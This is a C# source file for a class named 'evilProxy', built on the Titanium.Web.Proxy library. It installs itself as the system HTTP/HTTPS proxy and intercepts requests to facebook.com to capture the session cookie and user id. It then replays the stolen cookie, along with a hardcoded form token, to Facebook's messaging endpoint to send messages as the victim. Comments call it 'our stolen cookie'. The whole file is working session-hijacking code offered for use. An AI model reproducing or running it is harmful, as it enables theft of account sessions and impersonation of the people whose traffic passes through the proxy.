using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Titanium.Web.Proxy.EventArguments;
using Titanium.Web.Proxy.Models;

namespace Titanium.Web.Proxy.Examples.Basic
{
    public class evilProxy
    {
        private ProxyServer proxyServer;
        private string cookie = "";
        private string from = "";

        public evilProxy()
        {
            proxyServer = new ProxyServer();
        }

        public void StartProxy()
        {
            proxyServer.BeforeRequest += OnRequest;
            var explicitEndPoint = new ExplicitProxyEndPoint(IPAddress.Any, 8000, true);//listen on port 8000

            proxyServer.AddEndPoint(explicitEndPoint);
            proxyServer.Start();
            
            
            foreach (var endPoint in proxyServer.ProxyEndPoints)
                Console.WriteLine("Listening on '{0}' endpoint at Ip {1} and port: {2} ",
                    endPoint.GetType().Name, endPoint.IpAddress, endPoint.Port);

            //Only explicit proxies can be set as system proxy!
            proxyServer.SetAsSystemHttpProxy(explicitEndPoint);
            proxyServer.SetAsSystemHttpsProxy(explicitEndPoint);
        }

        public void Stop()
        {
            proxyServer.BeforeRequest -= OnRequest;

            proxyServer.Stop();
        }

        //intecept & cancel, redirect or update requests
        public async Task OnRequest(object sender, SessionEventArgs e)
        {
            if (!e.WebSession.Request.Url.Contains("https://www.facebook.com/")) return;

            if (cookie.Length > 40) return;
            cookie = e.WebSession.Request.RequestHeaders.Find(x => x.Name == "Cookie").Value;

            Console.WriteLine(e.WebSession.Request.RequestHeaders.Find(x => x.Name == "Cookie").Value);
            Console.WriteLine("Faceook Cookie Found !!!! :D");

            var match = Regex.Match(cookie,"c_user=[0-9]+[;]");
            from = Regex.Match(match.Value, "[0-9]+").Value;
            Console.WriteLine("User Found : " + from);
           
        }

        /// <summary>
        /// use this to send messages to user on facebook
        /// wuth our stolen cookie
        /// </summary>
        /// <param name="msg">msg content</param>
        /// <param name="to">user to send the message to</param>
        public void sendMessage(string msg,string to)
        { 
                int num = new Random().Next(10000, 90000); //random thread id =]
      
                WebClient client = new WebClient();
                string data = "message_batch%5B0%5D%5Baction_type%5D=ma-type%3Auser-generated-message&message_batch%5B0%5D%5Bthread_id%5D=&message_batch%5B0%5D%5Bauthor%5D=fbid%3A" + from + "&message_batch%5B0%5D%5Bauthor_email%5D=&message_batch%5B0%5D%5Btimestamp%5D=1467213876031&message_batch%5B0%5D%5Btimestamp_absolute%5D=Today&message_batch%5B0%5D%5Btimestamp_relative%5D=6%3A24pm&message_batch%5B0%5D%5Btimestamp_time_passed%5D=0&message_batch%5B0%5D%5Bis_unread%5D=false&message_batch%5B0%5D%5Bis_forward%5D=false&message_batch%5B0%5D%5Bis_filtered_content%5D=false&message_batch%5B0%5D%5Bis_filtered_content_bh%5D=false&message_batch%5B0%5D%5Bis_filtered_content_account%5D=false&message_batch%5B0%5D%5Bis_filtered_content_quasar%5D=false&message_batch%5B0%5D%5Bis_filtered_content_invalid_app%5D=false&message_batch%5B0%5D%5Bis_spoof_warning%5D=false&message_batch%5B0%5D%5Bsource%5D=source%3Achat%3Aweb&message_batch%5B0%5D%5Bsource_tags%5D%5B0%5D=source%3Achat&message_batch%5B0%5D%5Bbody%5D=" + msg + "&message_batch%5B0%5D%5Bhas_attachment%5D=false&message_batch%5B0%5D%5Bhtml_body%5D=false&message_batch%5B0%5D%5Bspecific_to_list%5D%5B0%5D=fbid%3A" + to + "&message_batch%5B0%5D%5Bspecific_to_list%5D%5B1%5D=fbid%3A" + from + "&message_batch%5B0%5D%5Bui_push_phase%5D=V3&message_batch%5B0%5D%5Bstatus%5D=0&message_batch%5B0%5D%5Boffline_threading_id%5D=61539410290954" + num + "&message_batch%5B0%5D%5Bmessage_id%5D=61539410290954" + num + "&message_batch%5B0%5D%5Bephemeral_ttl_mode%5D=0&message_batch%5B0%5D%5Bmanual_retry_cnt%5D=0&message_batch%5B0%5D%5Bother_user_fbid%5D=" + to + "&client=mercury&__user=" + from + "&__a=1&__dyn=7AmajEzUGByA5Q9UoHaEWC5ER6yUmyUyGiyEyeqrWo8popyui9wWhEoyUnwgUb8eQ4UJi28rxuF8W4emVWxeUWq58O5pQEd99uum4UpK6q-FFUlxrxOcxu5ocE88C9z9oybx24o9Esw&__req=v&__be=-1&__pc=PHASED%3ADEFAULT&fb_dtsg=AQFVUmjwSCO3%3AAQFsBih81IIO&ttstamp=265817086851091061198367795158658170115661051045649737379&__rev=2419142";
               
                client.Headers.Add(HttpRequestHeader.Cookie, cookie); //our stolen cookie ;)
                client.Headers.Add(HttpRequestHeader.ContentType, "application/x-www-form-urlencoded");
                client.Headers.Add("Origin", "https://www.facebook.com");
                client.Headers.Add("X-MSGR-Region", "LLA");
                client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36");
                client.Headers.Add("Accept", "*/*");
                client.Headers.Add("Referer", "https://www.facebook.com/");
                client.Headers.Add(HttpRequestHeader.AcceptEncoding, "gzip,deflate,br");
                client.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US,en;q=0.8");
                try
                {
                    var payload = "message_batch%5B0%5D%5Baction_type%5D=ma-type%3Auser-generated-message&message_batch%5B0%5D%5Bthread_id%5D=&message_batch%5B0%5D%5Bauthor%5D=fbid%3A" + from + "&message_batch%5B0%5D%5Bauthor_email%5D=&message_batch%5B0%5D%5Btimestamp%5D=1467213876031&message_batch%5B0%5D%5Btimestamp_absolute%5D=Today&message_batch%5B0%5D%5Btimestamp_relative%5D=6%3A24pm&message_batch%5B0%5D%5Btimestamp_time_passed%5D=0&message_batch%5B0%5D%5Bis_unread%5D=false&message_batch%5B0%5D%5Bis_forward%5D=false&message_batch%5B0%5D%5Bis_filtered_content%5D=false&message_batch%5B0%5D%5Bis_filtered_content_bh%5D=false&message_batch%5B0%5D%5Bis_filtered_content_account%5D=false&message_batch%5B0%5D%5Bis_filtered_content_quasar%5D=false&message_batch%5B0%5D%5Bis_filtered_content_invalid_app%5D=false&message_batch%5B0%5D%5Bis_spoof_warning%5D=false&message_batch%5B0%5D%5Bsource%5D=source%3Achat%3Aweb&message_batch%5B0%5D%5Bsource_tags%5D%5B0%5D=source%3Achat&message_batch%5B0%5D%5Bbody%5D=" + msg + "&message_batch%5B0%5D%5Bhas_attachment%5D=false&message_batch%5B0%5D%5Bhtml_body%5D=false&message_batch%5B0%5D%5Bspecific_to_list%5D%5B0%5D=fbid%3A" + to + "&message_batch%5B0%5D%5Bspecific_to_list%5D%5B1%5D=fbid%3A" + from + "&message_batch%5B0%5D%5Bui_push_phase%5D=V3&message_batch%5B0%5D%5Bstatus%5D=0&message_batch%5B0%5D%5Boffline_threading_id%5D=61539410290954" + num + "&message_batch%5B0%5D%5Bmessage_id%5D=61539410290954" + num + "&message_batch%5B0%5D%5Bephemeral_ttl_mode%5D=0&message_batch%5B0%5D%5Bmanual_retry_cnt%5D=0&message_batch%5B0%5D%5Bother_user_fbid%5D=" + to + "&client=mercury&__user=" + from + "&__a=1&__dyn=7AmajEzUGByA5Q9UoHaEWC5ER6yUmyUyGiyEyeqrWo8popyui9wWhEoyUnwgUb8eQ4UJi28rxuF8W4emVWxeUWq58O5pQEd99uum4UpK6q-FFUlxrxOcxu5ocE88C9z9oybx24o9Esw&__req=v&__be=-1&__pc=PHASED%3ADEFAULT&fb_dtsg=AQFVUmjwSCO3%3AAQFsBih81IIO&ttstamp=265817086851091061198367795158658170115661051045649737379&__rev=2419142";
                    client.UploadString("https://www.facebook.com/ajax/mercury/send_messages.php?dpr=1", payload);
                    Console.WriteLine("Sending : " + msg);
                }
                catch (Exception)
                {
                    //Console.WriteLine("fail");
                }
        }


        //Modify response
        /*
        public async Task OnResponse(object sender, SessionEventArgs e)
        {
        }
        */
    }
}